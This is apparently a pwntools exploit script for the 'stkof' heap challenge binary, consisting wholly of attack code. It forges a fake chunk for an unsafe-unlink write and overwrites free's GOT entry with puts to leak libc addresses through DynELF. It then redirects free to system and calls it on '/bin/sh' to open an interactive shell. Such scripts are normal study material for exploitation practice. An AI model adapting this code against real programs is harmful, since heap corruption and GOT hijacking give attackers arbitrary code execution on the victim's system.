from pwn import *

context.log_level = 'debug'
sock = process('./stkof')
print proc.pidof(sock)[0]

pause()

def add(len):
    sock.sendline('1')
    sock.sendline(str(len))
    sock.recvn(5)

def edit(index, content):
    sock.sendline('2')
    sock.sendline(str(index))
    sock.sendline(str(len(content)))
    sock.send(content)
    sock.recvn(3)

def delete(index):
    sock.sendline('3')
    sock.sendline(str(index))

#leak at least 1 byte then everything is OK
def peek(addr):
    edit(2, 'A'*16 + p64(addr))
    delete(1)
    str = sock.recvuntil('OK\n')
    result = str.split('\x0aOK')[0]
    if result == '':
        return '\x00'
    return result

bag = 0x602140

gdb.attach(sock)
add(0x48)    #1
add(0x48)    #2
add(0x100-8) #3
add(0x100-8) #4
add(0x100-8) #5

x = bag + 2*8
fd = x - 0x18
bk = x - 0x10

edit(2, p64(0) + p64(0) + p64(fd) + p64(bk) + 'C'*32 + p64(0x40) + '\x00')
delete(3)
print sock.recvn(3)

puts_plt = 0x400760
free_got = 0x602018
atoi_got = 0x602088
alarm_got = 0x602048
puts_got = 0x602020

#replace free by puts
edit(2, 'A'*16 + p64(free_got))
edit(1, p64(puts_plt))

d = DynELF(peek, elf=ELF('./stkof'))
system_addr = int(d.lookup('system', 'libc'))

#write /bin/sh
edit(4, '/bin/sh\0')

#replace free by system
edit(2, 'A'*16 + p64(free_got))
edit(1, p64(system_addr))

#call system(/bin/sh)
delete(4)

sock.interactive()

